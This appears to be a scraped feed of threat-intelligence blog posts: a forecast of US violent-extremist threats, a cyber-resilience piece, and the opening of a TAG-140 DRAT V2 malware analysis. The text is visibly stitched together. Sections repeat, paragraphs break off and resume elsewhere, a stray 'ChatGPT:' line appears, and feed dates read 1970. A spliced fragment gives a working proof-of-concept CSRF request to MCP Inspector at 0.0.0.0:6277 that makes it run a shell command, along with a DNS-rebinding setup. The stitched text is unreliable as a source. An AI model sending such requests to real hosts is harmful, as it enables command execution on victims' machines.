FTOs in 2025. US HVEs almost certainly continue to provide financial assistance to IS, al-Qaeda, and Hamas through cryptocurrencies. For example, Hamas has almost certainly <a href=\"https://www.justice.gov/archives/opa/pr/global-disruption-three-terror-finance-cyber-enabled-campaigns\">developed</a> a sophisticated network of cryptocurrency wallets and exchanges it uses to <a href=\"https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure\">funnel</a> funds from its international supporters to its operatives in the Palestinian Territories. HVEs are very likely to continue <a href=\"https://ctc.westpoint.edu/on-the-horizon-the-ukraine-war-and-the-evolving-threat-of-drone-terrorism/\">experimenting</a> with these new technologies for <a href=\"https://ctc.westpoint.edu/printing-terror-an-empirical-overview-of-the-use-of-3d-printed-firearms-by-right-wing-extremists/\">applications</a> in attack plotting, particularly with UAV-borne improvised explosive devices (IEDs) and 3D-printed firearms and weapons components.</p>\n        <h3>Islamic State</h3>\n        <p>The most persistent and lethal violent extremist threat to the US during the next twelve months will very likely come from IS supporters in the US who plan physical threat activities alone or in small groups, rely on minimal external direction from IS, and use less-sophisticated TTPs such as attacks with firearms, bladed weapons, and vehicular assaults. On New Year’s Day 2025, for example, Shamsud Din Jabbar <a href=\"https://www.fbi.gov/contact-us/field-offices/neworleans/news/fbi-releases-investigative-update-in-bourbon-street-attack\">carried out</a> the first lethal attack in the US connected to IS since 2017, <a href=\"https://www.ic3.gov/PSA/2025/PSA250113\">piloting</a> a pickup truck into a crowd in New Orleans, killing fourteen and wounding over 50. The attack followed a notable uptick in IS activity in the US; according to data from the George Washington University Program on Extremism, the US Department of Justice (DOJ) <a href=\"https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2025-01/Jihadism%20Trends%20in%202024%20%281%29.pdf\">arrested</a> nine IS sympathizers on federal charges in 2024, in comparison to six the year prior. These cases allegedly included major efforts by IS sympathizers to conduct mass-casualty attacks in the US, including an Oklahoma resident <a href=\"https://www.justice.gov/archives/opa/pr/afghan-national-arrested-plotting-election-day-terrorist-attack-name-isis\">arrested</a> in October 2024 for planning to attack an election facility on Election Day and a Canada resident <a href=\"https://www.justice.gov/usao-sdny/pr/pakistani-national-charged-plotting-terrorist-attack-new-york-city-support-isis\">arrested</a> in September 2024 for planning to enter the US and carry out a mass shooting at a Jewish community center in New York City.</p>\n        <p>Insikt Group’s June 2024 <a href=\"https://go.recordedfuture.com/hubfs/reports/ta-2024-0611.pdf\">assessment</a> that the IS Khorasan Province (ISKP) would become IS’s global “standard-bearer for external operations and media production” was largely accurate. ISKP attack planners, functioning alongside IS logistic networks in Central Asia and Türkiye and Russian-, Uzbek-, and Tajik-speaking supporters in Europe, <a href=\"https://www.washingtoninstitute.org/policy-analysis/islamic-states-external-operations-are-more-just-iskp\">carried out</a> several major terrorist attacks in 2024. Notably, these included the January 2024 suicide bombings in Kerman, Iran, that killed over 90, as well as the March 2024 mass shooting at the Crocus City Hall in Moscow, Russia, that resulted in hundreds of casualties, including 145 dead. Attack plots connected to the ISKP were also disrupted by security services in the US, France, Germany, Austria, Belgium, and other countries, including a thwarted effort by ISKP supporters residing in Austria to <a href=\"https://ctc.westpoint.edu/the-august-2024-taylor-swift-vienna-concert-plot/\">attack</a> a Taylor Swift concert in Vienna in August 2024. These efforts followed a lengthy and almost certainly ongoing <a href=\"https://jamestown.org/program/islamic-state-increasingly-targeted-and-threatened-western-sporting-events-in-advance-of-the-paris-olympics/\">campaign</a> spearheaded by the al-Azaim Foundation for Media Production — ISKP’s media arm — to <a href=\"https://gnet-research.org/2024/06/27/iskps-latest-campaign-expanded-propaganda-and-external-operations/\">encourage</a> supporters around the world to conduct attacks targeting sports stadiums, large concert halls, and major public events in the US and Europe.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"unnamed.png\" src=\"https://www.recordedfuture.com/media_14a682c73ec45c47815fe4fab151d33964979ea6b.png?width=750&amp;format=png&amp;optimize=medium\" width=\"737\" height=\"588\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>September 5, 2024, graphic from al-Azaim Foundation for Media Production encouraging attacks in the United States (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>While US-based IS supporters have represented a persistent threat despite ebbs and flows in the organization’s health overseas, ongoing geopolitical developments that are very likely <a href=\"https://foreignpolicy.com/2025/06/05/syrias-islamic-state-is-surging/\">favorable</a> to IS will likely enhance its ability to inspire and direct plots in the US. The fall of the Assad regime in Syria, ongoing Turkish military operations in the north of the country, and a decrease in foreign assistance (through funds and military support) to the Kurdish-led Syrian Democratic Forces (SDF) will very likely create <a href=\"https://www.understandingwar.org/backgrounder/us-withdrawal-syria-will-reinvigorate-isis-terror-threat\">opportunities</a> for IS in Iraq and al-Sham (ISIS) to exploit security vacuums and threaten areas in east and northeast Syria. The threat of an ISIS resurgence in 2025 would almost certainly be <a href=\"https://www.washingtoninstitute.org/policy-analysis/islamic-state-attacks-new-syrian-government\">exacerbated</a> by major terrorist attacks against the new Syrian government, or alternatively by a “prison break” operation to <a href=\"https://www.politico.com/news/2024/12/17/us-syria-isis-jails-00194955\">free</a> captive ISIS fighters and supporters in the SDF-managed al-Hawl and al-Roj prison camps. In the immediate term, an ISIS resurgence would almost certainly provide a propaganda boost for the group’s international supporters. In the medium term, it could create opportunities for ISIS to relaunch its external operations capabilities and target the US.</p>\n        <h3>Al-Qaeda</h3>\n        <p>Al-Qaeda very likely has a limited degree of support among American jihadist Salafi HVEs and is very unlikely to gain much more support due to the ongoing influence of its competitor, IS. In 2024, the US Intelligence Community assessed that al-Qaeda’s central command had <a href=\"https://www.dni.gov/files/ODNI/documents/assessments/ATA-2024-Unclassified-Report.pdf\">reached</a> its “operational nadir.” While some of the group’s franchises enjoyed substantial success during the past twelve months, the strongest al-Qaeda franchises will likely remain <a href=\"https://www.csis.org/analysis/jihadist-terrorism-united-states#:~:text=Aside%20from%20the%209%2F11,in%20which%20a%20Royal%20Saudi\">focused</a> on their areas of operation and are unlikely to devote significant resources to attacking the West in the short term. Nevertheless, the activities of specific al-Qaeda affiliates in 2024 and early 2025 portend an expanded threat to the US:</p>\n        <ul>\n          <li>In early 2025, Al-Shabaab <a href=\"https://www.france24.com/en/live-news/20250327-fears-mount-over-resurgence-of-al-shabaab-jihadists-in-somalia\">launched</a> a military operation in the Shabelle and Hiiraan regions of Somalia to recapture areas it held prior to a 2022 counterterrorism operation by the Somali Armed Forces. This ongoing operation will very likely <a href=\"https://warontherocks.com/2025/06/flailing-state-the-resurgence-of-al-shabaab-in-somalia/\">position</a> al-Shabaab to threaten the capital city, Mogadishu, as well as the Somalian government’s control over large swaths of the country.

Several factors during the next twelve months, including public incitement of attacks on US soil by Iranian officials or future US military activity against Iran, could <a href=\"https://www.dhs.gov/ntas/advisory/national-terrorism-advisory-system-bulletin-june-22-2025\">augment</a> these threats, although the most likely scenario is US HVEs and DVEs attempting to provide financial and material support to these groups on their own.</p>\n        <p>Iran’s proxies have not publicly indicated their interest in recruiting or directing Americans to conduct attacks on their behalf in the US since October 7, 2023.

Iran’s motivation to revitalize these efforts, several of which have been <a href=\"https://edition.cnn.com/2022/08/10/politics/justice-department-charges-iranian-with-trying-to-assassinate-john-bolton\">identified</a> and <a href=\"https://www.pbs.org/newshour/world/pakistani-man-with-ties-to-iran-is-charged-in-u-s-political-assassination-plot\">disrupted</a> by US law enforcement, likely increased in the immediate aftermath of US directly attacking Iran, although the subsequent ceasefire and cessation of US military activity in Iran will very likely decrease Iran’s appetite for remotely guiding terror plots in the medium-to-long term, if the ceasefire holds. There is no evidence to suggest that the IRGC exclusively recruits ideologically motivated violent extremists for these efforts (many of their <a href=\"https://www.bbc.com/news/articles/c308p0rjq9zo\">assets</a> have been <a href=\"https://www.justice.gov/archives/opa/pr/justice-department-announces-murder-hire-and-related-charges-against-irgc-asset-and-two\">participants</a> in criminal organizations who are financially solicited to conduct attacks), and Iran will very likely attempt to <a href=\"https://www.cbsnews.com/amp/news/trump-administration-monitor-iran-backed-cells-trump-weighs-strikes/\">exploit</a> threat actors in the US with common ideological causes to conduct attacks on their behalf.</p>\n        <p>Hezbollah’s ability to conduct extraterritorial attacks outside of Lebanon was almost certainly diminished by the leadership losses the organization <a href=\"https://www.washingtoninstitute.org/policy-analysis/after-hezbollahs-miscalculations-it-has-lost-much-its-power\">suffered</a> during Israeli strikes in 2024, particularly its secretaries general Hassan Nasrallah and Hashem Safieddine and military leaders Fuad Shukr and Ibrahim Aqil. Notably, Aqil was a senior <a href=\"https://www.washingtoninstitute.org/policy-analysis/death-another-hezbollah-lifer\">member</a> of Hezbollah’s Islamic Jihad Organization, which has historically been <a href=\"https://www.odni.gov/nctc/terrorist_groups/lebanese_hizballah.html\">responsible</a> for planning external operations, including in the US. Ongoing Lebanese government efforts to demilitarize Hezbollah will likely further reduce the group’s capabilities and interest in attacking the West. In 2024, there were sporadic instances of US HVEs attempting to <a href=\"https://www.justice.gov/usao-wdpa/pr/upper-st-clair-man-who-traveled-lebanon-and-syria-goal-joining-hizballah-indicted\">provide</a> material support for Hezbollah by joining the organization, although in these cases Hezbollah almost certainly indicated they were uninterested in taking on US or Western foreign fighters.</p>\n        <p>Likewise, the Houthis have not demonstrated the intent, capability, or interest in conducting terrorist attacks in the US, preferring to <a href=\"https://www.crisisgroup.org/visual-explainers/red-sea/\">target</a> commercial vessels in the Red Sea and, on occasion, Israel. On March 5, 2025, the US Department of State <a href=\"https://www.state.gov/designation-of-ansarallah-as-a-foreign-terrorist-organization/\">redesignated</a> the Houthis as an FTO just before the <a href=\"https://news.usni.org/2025/04/29/operation-rough-rider\">launch</a> of Operation Rough Rider, a US military campaign of airstrikes against the organization in Yemen. During the next twelve months, there are likely to be instances where US HVEs donate or otherwise provide material support to the Houthis.

These threats likely surpass the risk of DVE mass-casualty terrorist attacks due to their elevated frequency, success rate, and impact on the targeted entity’s operations. While certain categories of homegrown violent extremists (HVEs) and some DVEs will almost certainly continue to plan and threaten mass-casualty attacks, recent high-profile assassinations and assassination attempts in the US have very likely increased the probability of DVEs considering limited-scope methods. Violent extremists have almost certainly glorified the alleged perpetrators of these attacks and promoted narratives suggesting that targeted attacks against high-profile public figures more effectively achieve their political and ideological goals than mass-casualty attacks.\nTo support attack plots and bolster their operational footprint in 2025 and early 2026, HVEs and DVEs will almost certainly continue issuing online threats; stalking, harassing, and physically approaching victims; and conducting sabotage, surveillance, disruptive demonstrations, doxing, and swatting. As in previous years, personnel and facilities associated with racial, ethnic, and religious minorities, the LGBTQIA+ community, US federal, state, local, tribal, and territorial government agencies (particularly judicial and law enforcement agencies), specific private industry sectors (defense contractors, healthcare and pharmaceutical companies, financial and insurance agencies), and critical infrastructure providers are at heightened risk from HVE and DVE threat activities during the next twelve months.\nPolarizing geopolitical and domestic political issues — especially conflicts in the Middle East involving Israel, the 2024 fall of the Bashar al-Assad regime in Syria, and US immigration enforcement policies — will almost certainly continue to mobilize HVEs and DVEs during the next twelve months. While expected tactics, techniques, and procedures (TTPs) associated with US violent extremists are unlikely to significantly change in the short term, DVEs and HVEs are very likely to accelerate adoption of new technologies, such as commercially available unmanned aerial vehicles (UAVs), generative artificial intelligence (AI), end-to-end encrypted communications platforms, cryptocurrencies, and 3D printing, to enhance their operational capabilities.\nRapidly shifting developments in the violent extremist threat landscape in the US and changing priorities of US federal law enforcement and homeland security agencies could place more of the onus on state and local governments and the private sector to manage their own counterterrorism programming. As always, facility security initiatives and hardening soft targets will undoubtedly remain important, but recent incidents and violent extremists’ growing preference for targeted attacks against high-profile personnel suggest that executive protection is an increasingly crucial aspect of countering violent extremist threats to organizations. Organizations can mitigate threats to executives not only through reactive detection of online threats and negative sentiment campaigns, but also by proactively identifying and removing publicly available information that can be used to target personnel. Physical security teams can query the Recorded Future Intelligence Cloud’s extensive corpus of sources used by violent extremists to analyze intelligence pertaining to these and other violent extremist threats.\nKey Findings\nDuring the next twelve months:\nThe US will very likely face a heightened threat from violent extremist physical threat activities due to the enduring influence of the Israel-Hamas conflict; geopolitical developments in the Middle East, Central Asia, and Africa favoring foreign terrorist organizations (FTOs); and the increasing ease of access to and use of new and developing technologies.\nWhile their preferred targets vary, most violent extremist threat actors are almost certainly interested in threatening US federal, state, and local governments. Critical infrastructure providers, defense contractors, and the education, insurance, healthcare, banking, finance, and maritime industry sectors also very likely face heightened risks.\nIslamic State (IS) supporters will very likely represent the most lethal HVE threat to the US, especially if IS experiences a resurgence in Syria following the 2024 fall of the al-Assad government.\nHVEs with a nexus to Hamas, Hezbollah, the Yemeni Houthis, Iraqi Shi’a militias, or other “Axis of Resistance” groups are unlikely to carry out attacks in the US, but they likely have increased motivation to do so and access to expanded facilitative resources due to the US’s direct involvement in the Iran-Israel conflict.\nThe DVE groups that likely pose the largest threat of conducting violent attacks in the US, such as neo-Nazi accelerationists, anti-government/anti-authority violent extremists (AGAAVEs) motivated by political animus, and anarchist violent extremists (AVEs), are likely to increasingly prefer targeted attacks and assassinations over mass-casualty attack plots.\nMilitia violent extremists (MVEs), AVEs, and AGAAVEs harboring political grievances due to US domestic political issues will almost certainly physically threaten judges, public officials, business executives, and other high–profile public figures.\nBackground\nInsikt Group’s forecast is predicated on its assessments of open-source information on the activities of HVEs and DVEs in the US, including the Recorded Future Intelligence Cloud’s extensive index of HVE and DVE communications on various online platforms. During the past twelve months, Insikt Group researchers curated several hundred HVE and DVE sources, adding them to an extensive index of preexisting sources of this type.\nThis report defines “homegrown violent extremist,” “domestic violent extremist,” and several categories of HVEs and DVEs based on the US Intelligence Community’s definitions and categorizations of threat actors. Periodically, this report prefers definitions adopted by Insikt Group subject matter experts for analytic utility, or in instances where the US government has not officially defined a particular phenomenon or movement. A full list of terms and definitions used in this report is available in Appendix A.\nHomegrown Violent Extremists\nHVEs are very likely to carry out physical threat activities targeting US government and law enforcement installations and personnel, public events, large commercial spaces, houses of worship and religious communities, and counter-protestors and demonstrators. US-based IS supporters will very likely present the most lethal violent extremist threat to the US during the next twelve months, and the continued mobilization factor of the Israel-Hamas conflict will almost certainly drive some Americans to provide support for IS, al-Qaeda, and other FTOs (although organizations other than IS and al-Shabaab — al-Qaeda’s Somalia franchise — very likely lack the infrastructure, personnel, and interest in recruiting US persons).\nHowever, while sporadic escalations in the Israel-Hamas conflict will almost certainly influence disruptive protest activities and other physical threats in 2025, most visibly at US universities, threat actors will likely be deterred from overt displays of support for FTOs and plotting mass-casualty attacks due to the almost certain increase in law enforcement resources dedicated to investigating and prosecuting these threats. Instead, extant pro-Hamas networks in the US are very likely to emphasize covert operations, especially those that finance the organization.\nIn addition, the geopolitical climate likely favors efforts by IS and al-Qaeda affiliates in the Levant, Central Asia, the Sahel, and the Horn of Africa to expand their territorial holdings, conduct increasingly sophisticated and lethal attacks in their areas of operations, and develop connections between their operatives and recruitment networks in Western Europe and North America.\nExpanding commercial markets and ease of use of developing technologies — particularly UAVs and cryptocurrencies — are very likely to bolster HVE operations on behalf of a range of FTOs in 2025. US HVEs almost certainly continue to provide financial assistance to IS, al-Qaeda, and Hamas through cryptocurrencies. For example, Hamas has almost certainly developed a sophisticated network of cryptocurrency wallets and exchanges it uses to funnel funds from its international supporters to its operatives in the Palestinian Territories. HVEs are very likely to continue experimenting with these new technologies for applications in attack plotting, particularly with UAV-borne improvised explosive devices (IEDs) and 3D-printed firearms and weapons components.\nIslamic State\nThe most persistent and lethal violent extremist threat to the US during the next twelve months will very likely come from IS supporters in the US who plan physical threat activities alone or in small groups, rely on minimal external direction from IS, and use less-sophisticated TTPs such as attacks with firearms, bladed weapons, and vehicular assaults. On New Year’s Day 2025, for example, Shamsud Din Jabbar carried out the first lethal attack in the US connected to IS since 2017, piloting a pickup truck into a crowd in New Orleans, killing fourteen and wounding over 50. The attack followed a notable uptick in IS activity in the US; according to data from the George Washington University Program on Extremism, the US Department of Justice (DOJ) arrested nine IS sympathizers on federal charges in 2024, in comparison to six the year prior. These cases allegedly included major efforts by IS sympathizers to conduct mass-casualty attacks in the US, including an Oklahoma resident arrested in October 2024 for planning to attack an election facility on Election Day and a Canada resident arrested in September 2024 for planning to enter the US and carry out a mass shooting at a Jewish community center in New York City.\nInsikt Group’s June 2024 assessment that the IS Khorasan Province (ISKP) would become IS’s global “standard-bearer for external operations and media production” was largely accurate. ISKP attack planners, functioning alongside IS logistic networks in Central Asia and Türkiye and Russian-, Uzbek-, and Tajik-speaking supporters in Europe, carried out several major terrorist attacks in 2024. Notably, these included the January 2024 suicide bombings in Kerman, Iran, that killed over 90, as well as the March 2024 mass shooting at the Crocus City Hall in Moscow, Russia, that resulted in hundreds of casualties, including 145 dead. Attack plots connected to the ISKP were also disrupted by security services in the US, France, Germany, Austria, Belgium, and other countries, including a thwarted effort by ISKP supporters residing in Austria to attack a Taylor Swift concert in Vienna in August 2024. These efforts followed a lengthy and almost certainly ongoing campaign spearheaded by the al-Azaim Foundation for Media Production — ISKP’s media arm — to encourage supporters around the world to conduct attacks targeting sports stadiums, large concert halls, and major public events in the US and Europe.\nFigure 1: September 5, 2024, graphic from al-Azaim Foundation for Media Production encouraging attacks in the United States (Source: Recorded Future)\nWhile US-based IS supporters have represented a persistent threat despite ebbs and flows in the organization’s health overseas, ongoing geopolitical developments that are very likely favorable to IS will likely enhance its ability to inspire and direct plots in the US. The fall of the Assad regime in Syria, ongoing Turkish military operations in the north of the country, and a decrease in foreign assistance (through funds and military support) to the Kurdish-led Syrian Democratic Forces (SDF) will very likely create opportunities for IS in Iraq and al-Sham (ISIS) to exploit security vacuums and threaten areas in east and northeast Syria. The threat of an ISIS resurgence in 2025 would almost certainly be exacerbated by major terrorist attacks against the new Syrian government, or alternatively by a “prison break” operation to free captive ISIS fighters and supporters in the SDF-managed al-Hawl and al-Roj prison camps. In the immediate term, an ISIS resurgence would almost certainly provide a propaganda boost for the group’s international supporters. In the medium term, it could create opportunities for ISIS to relaunch its external operations capabilities and target the US.\nAl-Qaeda\nAl-Qaeda very likely has a limited degree of support among American jihadist Salafi HVEs and is very unlikely to gain much more support due to the ongoing influence of its competitor, IS. In 2024, the US Intelligence Community assessed that al-Qaeda’s central command had reached its “operational nadir.” While some of the group’s franchises enjoyed substantial success during the past twelve months, the strongest al-Qaeda franchises will likely remain focused on their areas of operation and are unlikely to devote significant resources to attacking the West in the short term. Nevertheless, the activities of specific al-Qaeda affiliates in 2024 and early 2025 portend an expanded threat to the US:\nIn early 2025, Al-Shabaab launched a military operation in the Shabelle and Hiiraan regions of Somalia to recapture areas it held prior to a 2022 counterterrorism operation by the Somali Armed Forces. This ongoing operation will very likely position al-Shabaab to threaten the capital city, Mogadishu, as well as the Somalian government’s control over large swaths of the country. A revanchist al-Shabaab with significant territorial control in Somalia would almost certainly threaten US interests in the Horn of Africa and the Middle East; the group also likely has the means and intent to threaten the US homeland by externally guiding attack plots.\nIn late 2023, Al-Qaeda in the Arabian Peninsula (AQAP) restarted its English-language Inspire series, which provides directions and information for English speakers on conducting terrorist attacks in the West. A February 2024 video specifically called for HVEs in the US to conduct local attacks because of the US’s support for Israel in its conflict against Hamas. In June 2025, a video message from AQAP leader Sa’ad bin Atef al-Awlaki encouraged HVEs to assassinate US political leaders, including President Trump and Vice President JD Vance.\nOn May 29, 2025, US Africa Command (AFRICOM) Commander General Michael Langley warned that Jama’at Nusrat al-Islam w’al-Muslimin (JNIM), an al-Qaeda franchise in the Sahel that has gained a substantial territorial footprint in the region, “could have the capacity to attack the homeland.” However, Insikt Group has not identified intelligence suggesting JNIM has displayed an interest in extraterritorial attack capabilities.\nUS-based IS and al-Qaeda supporters will almost certainly continue to use low-budget, low-sophistication, but lethal, methods of attack such as firearms, bladed weapons, and vehicular assaults, as well as retain their focus on targeting US government and law enforcement agencies, major public events, large commercial facilities, and targets associated with Jewish or Christian communities in the US. However, due to their increasing affordability, commercial availability, and ease of use, jihadist Salafi attack planners are also very likely to experiment with UAV and UAV-borne IEDs as attack TTPs. During 2024, jihadist Salafi propaganda frequently promoted the use of drones in conducting attacks, with some unofficial outlets providing guidance to supporters on how to operate them. A successful UAV-borne IED attack plot, whether in the US or overseas, would almost certainly demonstrate a proof of concept and supercharge jihadist Salafi HVEs’ interest in UAVs.\nHamas\nMass-casualty terrorist attacks in the US with a nexus to Hamas or other Palestinian Territories-based FTOs (including Palestinian Islamic Jihad [PIJ], the Popular Front for the Liberation of Palestine [PFLP], and others) remain very unlikely in the short term. These organizations have not demonstrated a capability or interest in conducting large-scale attacks in the US, although their ongoing conflict against Israel has almost certainly inspired US violent extremists without tangible ties to the organizations to conduct violence. Since Hamas’s October 7, 2023, al-Aqsa Flood terrorist attack in Israel, the Israel Defense Forces (IDF) have almost certainly decimated Hamas’s leadership, particularly within the Izz ad-Din al-Qassam Brigades, the organization’s military wing. Because of the element of inspiration, large-scale attack plots perpetrated by Hamas supporters in the US cannot be ruled out, although most violence with a direct link to the group is very likely to be small-scale and sporadic, and only occur at protests or demonstrations where Hamas supporters confront counter-demonstrators or law enforcement.\nWhile post-October 7 developments and Hamas’s conflict with Israel continue to almost certainly motivate sympathies for Hamas among American violent extremists, the primary means of interaction between US Hamas supporters and the organization’s command and control structure almost certainly continues to be through financing efforts. The group has almost certainly created a complex network of cryptocurrency donation portals, exchanges, and wallets, from which they have generated “tens of millions” of US dollars from foreign donors, including from the US. These networks have likely replaced the role of “brick-and-mortar” US-based charitable organizations that, for decades, have allegedly provided funds from US donors to Hamas, PIJ, PFLP, and other Palestinian FTOs.\nAxis of Resistance\nThe US missile strikes targeting Iranian nuclear facilities on June 21 and 22, 2025, likely increased the risk of HVE and DVE supporters of Iran and its Axis of Resistance groups, such as Hezbollah, the Houthis, Iraqi Shi’a militias, and others, conducting physical threat activities on US soil, although these groups are still unlikely to carry out a mass-casualty terrorist attack in the US during the next twelve months. While Iran’s military and intelligence agencies are likely to enhance their efforts to recruit assets in the US to carry out targeted attacks against US political figures and dissidents in the aftermath of the strikes, these efforts will very likely be constrained by US law enforcement investigations, the relative structural weakness of Axis of Resistance groups, and the almost certain disinterest of many US-based HVE and DVE groups in supporting Iran. Several factors during the next twelve months, including public incitement of attacks on US soil by Iranian officials or future US military activity against Iran, could augment these threats, although the most likely scenario is US HVEs and DVEs attempting to provide financial and material support to these groups on their own.\nIran’s proxies have not publicly indicated their interest in recruiting or directing Americans to conduct attacks on their behalf in the US since October 7, 2023. However, Iran’s military and intelligence agencies, particularly the Islamic Revolutionary Guard Corps (IRGC), have almost certainly continued their efforts to recruit and incite overseas threat actors to conduct targeted attacks and assassinations against high-profile US politicians and Iranian dissidents on US soil. Iran’s motivation to revitalize these efforts, several of which have been identified and disrupted by US law enforcement, likely increased in the immediate aftermath of US directly attacking Iran, although the subsequent ceasefire and cessation of US military activity in Iran will very likely decrease Iran’s appetite for remotely guiding terror plots in the medium-to-long term, if the ceasefire holds. There is no evidence to suggest that the IRGC exclusively recruits ideologically motivated violent extremists for these efforts (many of their assets have been participants in criminal organizations who are financially solicited to conduct attacks), and Iran will very likely attempt to exploit threat actors in the US with common ideological causes to conduct attacks on their behalf.\nHezbollah’s ability to conduct extraterritorial attacks outside of Lebanon was almost certainly diminished by the leadership losses the organization suffered during Israeli strikes in 2024, particularly its secretaries general Hassan Nasrallah and Hashem Safieddine and military leaders Fuad Shukr and Ibrahim Aqil. Notably, Aqil was a senior member of Hezbollah’s Islamic Jihad Organization, which has historically been responsible for planning external operations, including in the US. Ongoing Lebanese government efforts to demilitarize Hezbollah will likely further reduce the group’s capabilities and interest in attacking the West. In 2024, there were sporadic instances of US HVEs attempting to provide material support for Hezbollah by joining the organization, although in these cases Hezbollah almost certainly indicated they were uninterested in taking on US or Western foreign fighters.\nLikewise, the Houthis have not demonstrated the intent, capability, or interest in conducting terrorist attacks in the US, preferring to target commercial vessels in the Red Sea and, on occasion, Israel. On March 5, 2025, the US Department of State redesignated the Houthis as an FTO just before the launch of Operation Rough Rider, a US military campaign of airstrikes against the organization in Yemen. During the next twelve months, there are likely to be instances where US HVEs donate or otherwise provide material support to the Houthis.

When combined with a Cross-Site Request Forgery (CSRF) vulnerability, this allows attackers to send malicious HTTP requests from public web pages to the MCPP. For example, an attacker could craft a request such as:</p>\n        <ul>\n          <li><code>hxxp://0.0.0.0:6277/sse?transportType=stdio&amp;command=touch&amp;args=%2Ftmp%2Fexploited-from-the-browser</code></li>\n        </ul>\n        <p>The request runs <code>touch /tmp/exploited-from-the-browser</code> on the victim’s host, giving the attacker the same privileges as the user who started MCP Inspector and visibility into any network-attached resources.

An attacker hosts a webpage whose domain resolves first to a public IP and then (after the browser grants trust) to 127.0.0.1/0.0.0.0.

Assume hybrid threat scenarios where cyber attacks coordinate with disinformation campaigns, fraud operations, or supply-chain corruption.\nResilience Measurement and Validation\nMove beyond compliance theater toward continuous control validation. Organizations with genuine resilience (\"rizz\") regularly test defenses using real-world TTPs rather than audit checklists. Control validation platforms enable automated purple teaming and breach simulation using current adversary methodologies.\nCrisis Scenario Exercises\nConduct tabletop exercises simulating destructive ransomware, DNS hijacking, or public data exposure campaigns tied to adversarial propaganda. Include communications, legal, finance, and supply chain leadership in scenario planning.\nExternal Dependency Risk Assessment\nInventory and validate upstream service providers, including CDN, DNS, and hosting infrastructure. If Iranian botnets target DNS registrars or Russian DDoS campaigns affect ISP connectivity, backup options become critical.\nAI-Enabled Defense to Mirror Adversary Velocity\nModern threat actors leverage AI for campaign acceleration and evasion techniques. Defensive AI adoption becomes essential for matching adversary tempo and scale.\nAutomate initial incident triage using AI classification systems. When Iranian APT groups launch credential harvesting campaigns targeting hundreds of employees simultaneously, AI-driven email analysis can identify and quarantine malicious messages faster than manual review processes.\nImplement AI-enhanced deception technologies that adapt honeypot configurations based on observed attacker TTPs. Dynamic deception networks can automatically adjust to mirror production environments while capturing threat actor tooling and methodologies.\nUse generative AI for threat intelligence synthesis and executive reporting. Large language models can process multiple threat feeds, correlate indicators across campaigns, and generate actionable summaries for board-level consumption within minutes rather than hours.\nConsider AI-assisted red team exercises that continuously probe defenses using current adversary techniques. Automated purple teaming platforms can simulate Iranian spearphishing or Russian wiper campaigns at scale, identifying control gaps before real attacks exploit them.\nEven with the best of AI, human expertise remains critical for strategic decision-making, false positive management, and complex threat attribution. The optimal approach combines AI speed with human judgment.\nFrom Crisis Optics to Resilient Strategy\nKinetic escalation has opened pathways for asymmetric digital retribution. However, resilient enterprises leverage threat intelligence for decision-making before breaches occur. This requires abandoning audit theater, embracing proactive control validation, and communicating risk in executive-comprehensible language.\nThe current geopolitical environment demands evolved approaches to cyber resilience. Organizations that recognize this shift and adapt accordingly will maintain operational continuity while competitors struggle with reactive crisis management.\nIn this new phase of geopolitical conflict, it's not just data that is at stake—it's institutional confidence and competitive advantage.\nChatGPT: Thinking Through Cyber Resilience in the Face of Escalating Kinetic Activity.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_14e2c1f728ccd6f8b87aa92e5d3ce919a074d5772.png?width=1200&format=pjpg&optimize=medium"},"content":"Dive into the concept of the \"retaliation window\"—how timing influences threat intelligence, risk management, and strategic decision-making in today's cyber and business landscape.","contentSnippet":"Dive into the concept of the \"retaliation window\"—how timing influences threat intelligence, risk management, and strategic decision-making in today's cyber and business landscape.","guid":"https://www.recordedfuture.com/blog/the-retaliation-window","categories":["Blog"],"isoDate":"1970-01-21T06:17:16.000Z","tag":"intel"},{"title":"Analysis of TAG-140 Campaign and DRAT V2 Development Targeting Indian Government Organizations","link":"https://www.recordedfuture.com/research/drat-v2-updated-drat-emerges-tag-140s-arsenal","pubDate":"Wed, 21 Jan 1970 06:11:31 GMT","content:encoded":"\n        <p>\n          <img loading=\"lazy\" alt=\"insikt group logo\" src=\"https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"300\" height=\"48\" />\n        </p>\n        <h2>Executive Summary</h2>\n        <p>During an investigation into a <a href=\"https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence\">recent</a> TAG-140 campaign targeting Indian government organizations, Insikt Group identified a modified variant of the DRAT remote access trojan (RAT), which we designated as DRAT V2. TAG-140 has overlaps with SideCopy, an operational subgroup assessed to be a sub-cluster or operational affiliate of Transparent Tribe (also tracked as APT36, ProjectM, or MYTHIC LEOPARD). TAG-140 has consistently demonstrated iterative advancement and variety in its malware arsenal and delivery techniques. This latest campaign, which spoofed the Indian Ministry of Defence via a cloned press release portal, marks a slight but notable shift in both malware architecture and command-and-control (C2) functionality.</p>\n        <p>The deployment of DRAT V2 reflects TAG-140’s ongoing refinement of its remote access tooling, transitioning from a .NET-based version of DRAT to a new Delphi-compiled variant. Both versions are among numerous RATs the group has leveraged, such as CurlBack, SparkRAT, AresRAT, Xeno RAT, AllaKore, and ReverseRAT, indicating a pattern of rotating malware use. DRAT V2 updates its custom TCP-based, server-initiated C2 protocol and expands functional capabilities, including arbitrary shell command execution and enhanced file system interaction.</p>\n        <p>Analysis of the infection chain indicates that initial access was achieved through a ClickFix-style social engineering lure. Victims were enticed to execute a malicious script via mshta.exe, which led to the execution of the BroaderAspect .NET loader, which has <a href=\"https://www.seqrite.com/blog/umbrella-of-pakistani-threats-converging-tactics-of-cyber-operations-targeting-india\">previously</a> been used by TAG-140. BroaderAspect establishes persistence and subsequent DRAT V2 installation and execution.</p>\n        <p>Insikt Group attributes this activity to TAG-140 with moderate confidence based on domain overlap, malware lineage, and infrastructure characteristics. DRAT V2’s enhancements suggest a likely increase in TAG-140’s capacity for tailored post-exploitation and lateral movement across victim networks. As such, its emergence is a relevant indicator of the threat actor’s maturing tradecraft and strategic targeting of India’s defense and governmental institutions.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>DRAT V2 adds a new command 